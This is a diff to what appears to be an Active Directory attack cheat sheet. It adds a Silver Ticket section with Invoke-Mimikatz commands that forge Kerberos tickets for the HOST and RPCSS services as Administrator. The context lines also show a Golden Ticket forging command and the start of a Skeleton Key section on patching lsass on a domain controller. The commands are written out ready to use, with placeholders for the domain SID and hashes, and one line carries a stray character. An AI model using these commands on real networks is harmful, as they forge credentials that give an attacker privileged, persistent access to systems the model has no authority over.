@@ -14,11 +14,16 @@ C:> Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:<fqd
                                          /sid:<domain_sid> /krbtgt:<krbtgt_hash> /id:500 
                                          /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'
 ```
-
-
 ### Silver Ticket
-
-
+```powershell
+# Get Privileges to access HOST service as Administrator con host
+C:> Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:<domain_fqdn> /sid:<domain_sid> /target:<host_fqdn> 
+    /service:HOST /rc4:<host_ntlm_hash> /startoffset:0 /endin:600 /renewmax:10080 /ptt" "exit"'
+    
+# Privileges for RPCSS service
+C:> Invoke-Mimikatz -Command '0"kerberos::golden /User:Administrator /domain:<domain_fqdn> /sid:<domain_sid> /target:<host_fqdn>  
+    /service:RPCSS /rc4:<host_ntlm_hash> /startoffset:0 /endin:600 /renewmax:10080 /ptt" "exit"'
+```
 ### Skeleton Key
 ```powershell
 # Patch a DC `lsass` process allowing to use any user with single password. DA privileges are required.
